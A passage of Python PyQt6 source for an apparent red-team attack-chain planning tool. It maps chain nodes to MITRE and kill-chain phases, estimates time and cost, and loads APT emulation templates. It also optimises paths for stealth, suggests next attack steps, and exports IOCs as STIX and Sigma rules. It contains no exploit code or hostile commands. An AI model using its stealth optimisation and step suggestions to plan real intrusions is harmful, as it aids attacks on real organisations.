            'rating': complexity.rating,
            'unique_exploits': complexity.unique_exploits,
        }
        
        # Add MITRE tactics
        tactics = set()
        for node in self.canvas.nodes:
            node_type = node.get('type', 'exploit')
            if node_type in MITRE_ATTACK_MAPPING:
                tactics.add(node_type)
                for technique in MITRE_ATTACK_MAPPING[node_type].get('techniques', []):
                    tactics.add(technique[0])  # Technique ID
        basic_data['mitre_tactics'] = list(tactics)
        
        # Add resource estimation
        node_dicts = [{'type': n.get('type', 'exploit')} for n in self.canvas.nodes]
        resources = ResourceEstimator.estimate_chain(node_dicts)
        basic_data['resources'] = {
            'total_time_minutes': resources.total_time_minutes,
            'skill_level': resources.skill_level_required,
            'tools_required': resources.tools_required,
            'estimated_cost_usd': resources.estimated_cost_usd,
        }
        
        return basic_data
    
    def import_chain(self):
        """Import chain from JSON file"""
        filepath, _ = QFileDialog.getOpenFileName(
            self,
            "Import Attack Chain",
            "",
            "JSON Files (*.json);;All Files (*)"
        )
        
        if not filepath:
            return
        
        try:
            with open(filepath, 'r') as f:
                chain_data = json.load(f)
            
            # Validate structure
            if 'nodes' not in chain_data:
                raise ValueError("Invalid chain file: missing 'nodes'")
            
            # Save current state for undo
            self._save_undo_state()
            
            # Load chain data
            self._load_chain_data(chain_data)
            
            # Update chain name
            if 'name' in chain_data:
                self.chain_name.setText(chain_data['name'])
            
            self.output_text.append(f"üì• Imported: {os.path.basename(filepath)}")
            self.output_text.append(f"   üìä {len(self.canvas.nodes)} nodes loaded")
            
        except json.JSONDecodeError:
            self.output_text.append("‚ùå Invalid JSON file")
            QMessageBox.critical(self, "Import Error", "Invalid JSON file format")
        except Exception as e:
            self.output_text.append(f"‚ùå Import error: {str(e)}")
            QMessageBox.critical(self, "Import Error", f"Failed to import: {str(e)}")
    
    def _get_chain_data(self) -> dict:
        """Get chain data for export/save"""
        return {
            'name': self.chain_name.text(),
            'created': datetime.now().isoformat(),
            'version': '1.0',
            'nodes': [
                {
                    'id': n['id'],
                    'name': n['name'],
                    'type': n['type'],
                    'x': n['x'],
                    'y': n['y']
                }
                for n in self.canvas.nodes
            ],
            'connections': [
                {'from': f, 'to': t}
                for f, t in self.canvas.connections
            ],
            'metadata': {
                'node_count': len(self.canvas.nodes),
                'connection_count': len(self.canvas.connections)
            }
        }
    
    def _load_chain_data(self, data: dict):
        """Load chain data from import"""
        # Clear current chain
        self.canvas.nodes.clear()
        self.canvas.connections.clear()
        self.chain_counter = 0
        
        # Load nodes
        for node_data in data.get('nodes', []):
            node = {
                'id': node_data.get('id', f'node_{self.chain_counter + 1}'),
                'name': node_data.get('name', 'Unknown'),
                'type': node_data.get('type', 'exploit'),
                'x': node_data.get('x', 100),
                'y': node_data.get('y', 100)
            }
            self.canvas.nodes.append(node)
            self.chain_counter += 1
        
        # Load connections
        for conn_data in data.get('connections', []):
            from_id = conn_data.get('from')
            to_id = conn_data.get('to')
            if from_id and to_id:
                self.canvas.connections.append((from_id, to_id))
        
        self.canvas.update()
        self.update_stats()
    
    # ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    # TIMELINE & RESOURCE ESTIMATION METHODS - ULTIMATE EDITION
    # ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    
    def _generate_timeline(self):
        """Generate timeline visualization from current chain"""
        if not self.canvas.nodes:
            self.output_text.append("‚ö†Ô∏è No nodes to generate timeline")
            return
        
        entries = []
        current_time = 0
        
        # Build dependency map from connections
        dependencies = {}
        for from_id, to_id in self.canvas.connections:
            if to_id not in dependencies:
                dependencies[to_id] = []
            dependencies[to_id].append(from_id)
        
        # Generate timeline entries for each node
        for node in self.canvas.nodes:
            node_id = node.get('id')
            node_type = node.get('type', 'exploit')
            
            # Get duration from resource estimator
            base = ResourceEstimator.BASE_COSTS.get(node_type, {'time_minutes': 30})
            duration = base['time_minutes']
            
            # Calculate start time based on dependencies
            node_deps = dependencies.get(node_id, [])
            if node_deps:
                # Start after all dependencies complete
                dep_entries = [e for e in entries if e.node_id in node_deps]
                if dep_entries:
                    start_time = max(e.start_time + e.duration_minutes for e in dep_entries)
                else:
                    start_time = current_time
            else:
                start_time = current_time
            
            entry = ChainTimelineEntry(
                node_id=node_id,
                node_name=node.get('name', 'Unknown'),
                start_time=start_time,
                duration_minutes=duration,
                dependencies=node_deps,
                status='pending'
            )
            entries.append(entry)
            current_time = max(current_time, start_time + duration)
        
        # Update timeline widget
        self.timeline_widget.set_timeline_data(entries)
        
        # Update summary
        total_duration = max((e.start_time + e.duration_minutes) for e in entries) if entries else 0
        critical_duration = sum(e.duration_minutes for e in entries 
                               if e.node_id in self.timeline_widget.critical_path_entries)
        
        self.timeline_summary.setText(
            f"üìä Total Duration: {total_duration} min | "
            f"Critical Path: {critical_duration} min | "
            f"Parallelizable: {total_duration - critical_duration} min saved"
        )
        
        self.output_text.append(f"üìÖ Timeline generated: {len(entries)} entries, {total_duration} min total")
    
    def _toggle_timeline_dependencies(self, checked: bool):
        """Toggle dependency lines in timeline"""
        self.timeline_widget.show_dependencies = checked
        self.timeline_widget.update()
    
    def _toggle_critical_path(self, checked: bool):
        """Toggle critical path highlighting in timeline"""
        self.timeline_widget.show_critical_path = checked
        self.timeline_widget.update()
    
    def _update_resource_estimation(self):
        """Update resource estimation based on current chain"""
        if not self.canvas.nodes:
            self.resource_time_label.setText("‚è±Ô∏è Total Time: 0 min")
            self.resource_cost_label.setText("üí∞ Est. Cost: $0")
            self.resource_tools_label.setText("üîß Tools: None")
            return
        
        node_dicts = [{'type': n.get('type', 'exploit')} for n in self.canvas.nodes]
        skill_level = self.skill_combo.currentText()
        
        estimation = ResourceEstimator.estimate_chain(node_dicts, skill_level)
        
        # Update UI
        hours = estimation.total_time_minutes // 60
        mins = estimation.total_time_minutes % 60
        time_str = f"{hours}h {mins}m" if hours else f"{mins} min"
        self.resource_time_label.setText(f"‚è±Ô∏è Total Time: {time_str}")
        
        self.resource_cost_label.setText(f"üí∞ Est. Cost: ${estimation.estimated_cost_usd}")
        
        tools = estimation.tools_required[:5]
        tools_str = ", ".join(tools) if tools else "None"
        if len(estimation.tools_required) > 5:
            tools_str += f" +{len(estimation.tools_required) - 5} more"
        self.resource_tools_label.setText(f"üîß Tools: {tools_str}")
        
        # Stealth budget warning
        if estimation.stealth_budget < 0.3:
            self.resource_time_label.setStyleSheet("color: #ff4444; font-size: 11px;")
        else:
            self.resource_time_label.setStyleSheet("color: #e6edf3; font-size: 11px;")
    
    def _init_prerequisites(self):
        """Initialize prerequisites list"""
        self.prereqs_manager = PrerequisitesManager()
        self._update_prerequisites_list()
    
    def _update_prerequisites_list(self):
        """Update prerequisites list based on current chain"""
        if not hasattr(self, 'prereqs_manager'):
            self._init_prerequisites()
        
        self.prereq_list.clear()
        
        # Get all required prerequisites for nodes in chain
        required_prereqs = set()
        for node in self.canvas.nodes:
            node_type = node.get('type', 'exploit')
            unsatisfied = self.prereqs_manager.check_node_prerequisites(node_type)
            for prereq in unsatisfied:
                required_prereqs.add(prereq.prereq_id)
        
        # Populate list
        satisfied_count = 0
        total_count = 0
        
        for prereq in self.prereqs_manager.get_all_prerequisites():
            if prereq.prereq_id in required_prereqs or prereq.is_satisfied:
                total_count += 1
                icon = "‚úÖ" if prereq.is_satisfied else "‚¨ú"
                if prereq.is_satisfied:
                    satisfied_count += 1
                
                item = QListWidgetItem(f"{icon} {prereq.name}")
                item.setData(Qt.ItemDataRole.UserRole, prereq.prereq_id)
                item.setToolTip(prereq.description)
                
                if prereq.is_satisfied:
                    item.setForeground(QColor('#00ff00'))
                else:
                    item.setForeground(QColor('#ff9900'))
                
                self.prereq_list.addItem(item)
        
        self.prereq_status.setText(f"‚úÖ {satisfied_count} / {total_count} satisfied")
    
    def _toggle_prerequisite(self, item):
        """Toggle a prerequisite on/off"""
        prereq_id = item.data(Qt.ItemDataRole.UserRole)
        if prereq_id and hasattr(self, 'prereqs_manager'):
            prereq = self.prereqs_manager.prerequisites.get(prereq_id)
            if prereq:
                prereq.is_satisfied = not prereq.is_satisfied
                self._update_prerequisites_list()
                
                status = "satisfied" if prereq.is_satisfied else "unsatisfied"
                self.output_text.append(f"üìã Prerequisite '{prereq.name}' marked as {status}")
    
    def _calculate_complexity(self) -> ChainComplexityScore:
        """Calculate chain complexity score"""
        return ChainComplexityScore().calculate(self.canvas.nodes, self.canvas.connections)
    
    # ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    # KILL CHAIN, THREAT INTEL, AND WHAT-IF METHODS
    # ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    
    def _update_killchain_mapping(self):
        """Update kill chain widget with current chain"""
        if hasattr(self, 'killchain_widget'):
            self.killchain_widget.set_chain_data(self.canvas.nodes)
    
    def _on_killchain_phase_clicked(self, phase_id: str):
        """Handle click on kill chain phase"""
        phase = CyberKillChainMapper.get_phase_by_id(phase_id)
        if phase:
            nodes_in_phase = self.killchain_widget.phase_mapping.get(phase_id, [])
            node_names = ", ".join([n.get('name', 'Unknown')[:15] for n in nodes_in_phase[:3]])
            if len(nodes_in_phase) > 3:
                node_names += f" +{len(nodes_in_phase) - 3} more"
            self.output_text.append(f"üéØ {phase.name}: {len(nodes_in_phase)} nodes")
            if node_names:
                self.output_text.append(f"   Nodes: {node_names}")
            self.output_text.append(f"   Techniques: {', '.join(phase.techniques[:2])}")
    
    def _update_threat_intel(self):
        """Update threat intelligence matches"""
        if not hasattr(self, 'threat_match_list'):
            return
        
        self.threat_match_list.clear()
        
        if not self.canvas.nodes:
            self.threat_suggestions.setText("üí° Add nodes to match threat campaigns")
            return
        
        matches = ThreatIntelFusion.match_chain_to_campaigns(self.canvas.nodes)
        
        for match in matches[:3]:
            severity_icons = {'CRITICAL': 'üî¥', 'HIGH': 'üü†', 'MEDIUM': 'üü°'}
            icon = severity_icons.get(match['severity'], '‚ö™')
            
            item = QListWidgetItem(
                f"{icon} {match['name']} ({match['match_score']:.0f}% match)"
            )
            item.setData(Qt.ItemDataRole.UserRole, match)
            
            if match['match_score'] >= 70:
                item.setForeground(QColor('#ff4444'))
            elif match['match_score'] >= 40:
                item.setForeground(QColor('#ff8800'))
            else:
                item.setForeground(QColor('#ffff00'))
            
            self.threat_match_list.addItem(item)
        
        if not matches:
            item = QListWidgetItem("No threat campaign matches")
            item.setForeground(QColor('#666'))
            self.threat_match_list.addItem(item)
            self.threat_suggestions.setText("üí° Chain doesn't match known threat actor TTPs")
        else:
            suggestions = ThreatIntelFusion.get_similar_chains(self.canvas.nodes)
            if suggestions:
                self.threat_suggestions.setText(f"üí° {suggestions[0]}")
            else:
                self.threat_suggestions.setText(f"üí° Chain matches {len(matches)} known campaigns")
    
    def _on_threat_campaign_clicked(self, item):
        """Show details when threat campaign is clicked"""
        match = item.data(Qt.ItemDataRole.UserRole)
        if match:
            self.output_text.append(f"\nüïµÔ∏è Threat Campaign: {match['name']}")
            self.output_text.append(f"   Origin: {match['nation']}")
            self.output_text.append(f"   Match Score: {match['match_score']:.1f}%")
            self.output_text.append(f"   Matched TTPs: {', '.join(match['matched_techniques'][:5])}")
    
    def _run_whatif_analysis(self):
        """Run what-if scenario analysis"""
        if not self.canvas.nodes:
            self.whatif_result.setText("üìä Add nodes to analyze scenarios")
            self.whatif_success_bar.setValue(0)
            return
        
        scenario_map = {
            0: 'unpatched',
            1: 'edr_enabled',
            2: 'soc_active',
            3: 'air_gapped',
            4: 'insider_threat',
            5: 'zero_trust',
        }
        
        scenario_id = scenario_map.get(self.scenario_combo.currentIndex(), 'unpatched')
        analysis = WhatIfAnalyzer.analyze_scenario(self.canvas.nodes, scenario_id)
        
        if analysis:
            success_pct = int(analysis['overall_success'] * 100)
            self.whatif_success_bar.setValue(success_pct)
            
            # Color bar based on success
            if success_pct >= 70:
                chunk_color = "#00ff00"
            elif success_pct >= 40:
                chunk_color = "#ff8800"
            else:
                chunk_color = "#ff4444"
            
            self.whatif_success_bar.setStyleSheet(f"""
                QProgressBar {{
                    background: #1a1a1a; border: 1px solid #333;
                    border-radius: 4px; text-align: center; color: #fff;
                    font-size: 9px;
                }}
                QProgressBar::chunk {{ background: {chunk_color}; }}
            """)
            
            self.whatif_result.setText(
                f"üìä {analysis['scenario']}\n"
                f"Detection: {analysis['detection_change']} | Time: {analysis['time_change']}"
            )
    
    def _compare_all_scenarios(self):
        """Compare chain across all scenarios"""
        if not self.canvas.nodes:
            return
        
        results = WhatIfAnalyzer.compare_scenarios(self.canvas.nodes)
        
        self.output_text.append("\nüé≠ Scenario Comparison:")
        for result in results:
            success_pct = result['success_rate'] * 100
            icon = "üü¢" if success_pct >= 50 else "üü°" if success_pct >= 25 else "üî¥"
            self.output_text.append(
                f"   {icon} {result['scenario_name']}: {success_pct:.1f}% success"
            )
    
    # ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    # PATH OPTIMIZER, IOC GENERATOR, AND VERSION CONTROL METHODS
    # ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    
    def _optimize_attack_path(self):
        """Run attack path optimization"""
        if not self.canvas.nodes:
            self.optimizer_result.setText("‚ö†Ô∏è Add nodes to optimize")
            return
        
        objective_map = {
            0: 'speed',
            1: 'stealth',
            2: 'reliable',
            3: 'balanced'
        }
        
        objective = objective_map.get(self.optimizer_objective.currentIndex(), 'balanced')
        result = AttackPathOptimizer.optimize_path(
            self.canvas.nodes, 
            self.canvas.connections,
            objective
        )
        
        self.optimizer_result.setText(
            f"{result.path_description}\n"
            f"Success: {result.total_success_probability*100:.1f}% | "
            f"Time: {result.total_time_minutes}m | "
            f"Stealth: {result.stealth_score*100:.0f}%"
        )
        
        # Get suggestions
        suggestions = AttackPathOptimizer.suggest_improvements(
            self.canvas.nodes, self.canvas.connections
        )
        
        if suggestions:
            self.output_text.append("\nüöÄ Path Optimization Complete:")
            self.output_text.append(f"   {result.path_description}")
            self.output_text.append("\nüí° Suggestions:")
            for suggestion in suggestions[:3]:
                self.output_text.append(f"   {suggestion}")
    
    def _generate_iocs(self):
        """Generate IOCs from current chain"""
        if not self.canvas.nodes:
            self.ioc_count_label.setText("‚ö†Ô∏è No nodes to generate IOCs")
            return
        
        # Initialize IOC storage if not exists
        if not hasattr(self, '_generated_iocs'):
            self._generated_iocs = []
        
        self._generated_iocs = IOCGenerator.generate_iocs(self.canvas.nodes)
        
        count = len(self._generated_iocs)
        self.ioc_count_label.setText(f"üìä {count} IOCs generated")
        
        # Show summary in output
        self.output_text.append(f"\nüîç Generated {count} Indicators of Compromise:")
        
        # Group by type
        ioc_by_type = {}
        for ioc in self._generated_iocs:
            if ioc.ioc_type not in ioc_by_type:
                ioc_by_type[ioc.ioc_type] = []
            ioc_by_type[ioc.ioc_type].append(ioc)
        
        for ioc_type, iocs in ioc_by_type.items():
            self.output_text.append(f"   {ioc_type.upper()}: {len(iocs)} indicators")
    
    def _export_stix(self):
        """Export IOCs to STIX format"""
        if not hasattr(self, '_generated_iocs') or not self._generated_iocs:
            self._generate_iocs()
        
        if not self._generated_iocs:
            return
        
        stix_content = IOCGenerator.export_stix(self._generated_iocs)
        
        filepath, _ = QFileDialog.getSaveFileName(
            self, "Export STIX Bundle", 
            f"{self.chain_name.text()}_iocs.json",
            "JSON Files (*.json)"
        )
        
        if filepath:
            with open(filepath, 'w') as f:
                f.write(stix_content)
            self.output_text.append(f"üìÑ STIX bundle exported: {os.path.basename(filepath)}")
    
    def _export_sigma(self):
        """Export IOCs to Sigma rules"""
        if not hasattr(self, '_generated_iocs') or not self._generated_iocs:
            self._generate_iocs()
        
        if not self._generated_iocs:
            return
        
        sigma_content = IOCGenerator.export_sigma_rules(self._generated_iocs)
        
        filepath, _ = QFileDialog.getSaveFileName(
            self, "Export Sigma Rules",
            f"{self.chain_name.text()}_sigma.yaml",
            "YAML Files (*.yaml *.yml)"
        )
        
        if filepath:
            with open(filepath, 'w') as f:
                f.write(sigma_content)
            self.output_text.append(f"üìã Sigma rules exported: {os.path.basename(filepath)}")
    
    def _init_version_control(self):
        """Initialize version control system"""
        if not hasattr(self, 'version_control'):
            self.version_control = ChainVersionControl()
    
    def _save_chain_version(self):
        """Save current chain as a version"""
        self._init_version_control()
        
        if not self.canvas.nodes:
            self.version_label.setText("‚ö†Ô∏è No chain to version")
            return
        
        # Get version description
        from PyQt6.QtWidgets import QInputDialog
        description, ok = QInputDialog.getText(
            self, "Save Version",
            "Version description:",
            text=f"Version {len(self.version_control.versions) + 1}"
        )
        
        if ok and description:
            version_id = self.version_control.create_version(
                self.canvas.nodes,
                self.canvas.connections,
                description
            )
            
            self.version_label.setText(f"üìä {len(self.version_control.versions)} versions saved")
            self.output_text.append(f"üíæ Saved version: {version_id} - {description}")
    
    def _view_version_history(self):
        """View version history"""
        self._init_version_control()
        
        if not self.version_control.versions:
            self.output_text.append("üìú No versions saved yet")
            return
        
        self.output_text.append("\nüìú Version History:")
        for version in self.version_control.get_version_history():
            self.output_text.append(
                f"   {version.version_id} - {version.description}"
            )
            self.output_text.append(
                f"      üìÖ {version.timestamp[:19]} | "
                f"Nodes: {len(version.nodes_snapshot)} | "
                f"Connections: {len(version.connections_snapshot)}"
            )
    
    def _restore_version(self, version_id: str):
        """Restore a specific version"""
        self._init_version_control()
        
        result = self.version_control.restore_version(version_id)
        if result:
            nodes, connections = result
            self._save_undo_state()
            self.canvas.nodes = nodes
            self.canvas.connections = connections
            self.canvas.update()
            self.update_stats()
            self.output_text.append(f"‚Ü©Ô∏è Restored version: {version_id}")
    
    # ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    # APT EMULATION AND AUTO-GENERATOR METHODS
    # ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    
    def _load_apt_chain(self):
        """Load APT attack chain template"""
        apt_id = self.apt_combo.currentData()
        if not apt_id:
            return
        
        profile = APTEmulationLibrary.get_apt_profile(apt_id)
        if not profile:
            self.output_text.append(f"‚ö†Ô∏è APT profile not found: {apt_id}")
            return
        
        # Save current state for undo
        self._save_undo_state()
        
        # Clear and load chain
        self.canvas.nodes.clear()
        self.canvas.connections.clear()
        self.chain_counter = 0
        
        for name, node_type, x, y in profile.chain_template:
            self.chain_counter += 1
            node_id = f"node_{self.chain_counter}"
            self.canvas.add_node(node_id, name, node_type, x, y)
            
            if len(self.canvas.nodes) > 1:
                prev_node = self.canvas.nodes[-2]
                self.canvas.connect_nodes(prev_node['id'], node_id)
        
        self.update_stats()
        
        # Show APT info in output
        self.output_text.append(f"\nüé≠ Loaded APT Chain: {profile.name}")
        self.output_text.append(f"   üåç Origin: {profile.nation}")
        self.output_text.append(f"   üéØ Motivation: {profile.motivation}")
        self.output_text.append(f"   üõ†Ô∏è Tools: {', '.join(profile.tools[:3])}")
        self.output_text.append(f"   üìä Nodes: {len(profile.chain_template)}")
    
    def _show_apt_info(self):
        """Show detailed APT profile information"""
        apt_id = self.apt_combo.currentData()
        profile = APTEmulationLibrary.get_apt_profile(apt_id)
        
        if not profile:
            return
        
        self.output_text.append(f"\nüé≠ APT Profile: {profile.name}")
        self.output_text.append(f"   üìõ Aliases: {', '.join(profile.aliases)}")
        self.output_text.append(f"   üåç Nation: {profile.nation}")
        self.output_text.append(f"   üéØ Motivation: {profile.motivation}")
        self.output_text.append(f"   üè¢ Targets: {', '.join(profile.targets)}")
        self.output_text.append(f"   üõ†Ô∏è Tools: {', '.join(profile.tools)}")
        self.output_text.append(f"   üìã MITRE TTPs: {', '.join(profile.techniques[:5])}")
    
    def _auto_generate_chain(self):
        """Auto-generate attack chain based on target"""
        target_map = {
            0: 'enterprise_windows',
            1: 'cloud_aws',
            2: 'web_application',
            3: 'iot_scada',
        }
        
        target_type = target_map.get(self.target_combo.currentIndex(), 'enterprise_windows')
        chain = AutoChainGenerator.generate_chain(target_type)
        
        if not chain:
            return
        
        # Save current state for undo
        self._save_undo_state()
        
        # Clear and load chain
        self.canvas.nodes.clear()
        self.canvas.connections.clear()
        self.chain_counter = 0
        
        for name, node_type, x, y in chain:
            self.chain_counter += 1
            node_id = f"node_{self.chain_counter}"
            self.canvas.add_node(node_id, name, node_type, x, y)
            
            if len(self.canvas.nodes) > 1:
                prev_node = self.canvas.nodes[-2]
                self.canvas.connect_nodes(prev_node['id'], node_id)
        
        self.update_stats()
        
        target_name = self.target_combo.currentText()
        self.output_text.append(f"\nü§ñ Auto-generated chain for {target_name}")
        self.output_text.append(f"   üìä Nodes: {len(chain)}")
    
    def _suggest_next_step(self):
        """Suggest next steps for current chain"""
        suggestions = AutoChainGenerator.suggest_next_step(self.canvas.nodes)
        
        if not suggestions:
            self.output_text.append("üí° No suggestions available")
            return
        
        self.output_text.append("\nüí° Suggested Next Steps:")
        for suggestion in suggestions:
            self.output_text.append(
                f"   ‚û°Ô∏è {suggestion['name']} ({suggestion['type']})"
            )
            self.output_text.append(f"      {suggestion['reason']}")
    
    def contextMenuEvent(self, event):
        """Show context menu with quick actions"""
        menu = QMenu(self)
        menu.setStyleSheet("""
            QMenu {
                background: #1a1a1a;
                color: #00ff00;
                border: 1px solid #333;
            }
            QMenu::item:selected {
                background: #003300;
            }
        """)
        
        # Add actions
        export_action = menu.addAction("üì§ Export Chain")
        export_action.triggered.connect(self.export_chain)
        
        import_action = menu.addAction("üì• Import Chain")
        import_action.triggered.connect(self.import_chain)
        
        menu.addSeparator()
        
        clear_action = menu.addAction("üóëÔ∏è Clear Chain")
        clear_action.triggered.connect(self.clear_chain)
        
        undo_action = menu.addAction("‚Ü© Undo")
        undo_action.triggered.connect(self.undo_action)
        
        menu.addSeparator()
        
        validate_action = menu.addAction("üîç Validate Chain")
        validate_action.triggered.connect(self.validate_chain)
        
        menu.exec(event.globalPos())


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# ATTACK SIMULATION ENGINE - Real-time chain execution simulation
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class AttackSimulationEngine:
    """
    Real-time attack chain simulation with step-by-step execution,
    dynamic success/failure outcomes, and environmental factors
    """
    
    # Environmental factors that affect attack success
    ENVIRONMENTAL_FACTORS = {
        'network_segmentation': {'impact': -0.15, 'description': 'Network is segmented'},
        'ids_active': {'impact': -0.20, 'description': 'IDS/IPS actively monitoring'},
        'edr_deployed': {'impact': -0.25, 'description': 'EDR solution on endpoints'},
        'siem_monitoring': {'impact': -0.10, 'description': 'SIEM with alert rules'},
        'mfa_enabled': {'impact': -0.30, 'description': 'MFA on critical systems'},
        'patch_current': {'impact': -0.35, 'description': 'Systems fully patched'},
        'security_awareness': {'impact': -0.15, 'description': 'Staff security trained'},
        'zero_trust': {'impact': -0.40, 'description': 'Zero trust architecture'},
        'air_gapped': {'impact': -0.50, 'description': 'Air-gapped network segments'},
        'honeypots': {'impact': -0.10, 'description': 'Deception technology deployed'},
    }
    
    # Attack technique modifiers
    TECHNIQUE_MODIFIERS = {
